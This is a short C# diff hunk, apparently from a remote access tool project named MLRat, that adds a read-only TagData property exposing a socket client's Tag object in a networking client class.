@@ -11,6 +11,7 @@ namespace MLRat.Networking
     {
         private Guid _clientID, _pluginID;
         private eSock.Server.eSockClient Client;
+        public object TagData { get { return Client.Tag; } }
         public MLClient(Guid id, Guid pid, eSock.Server.eSockClient _client)
         {
             _clientID = id;
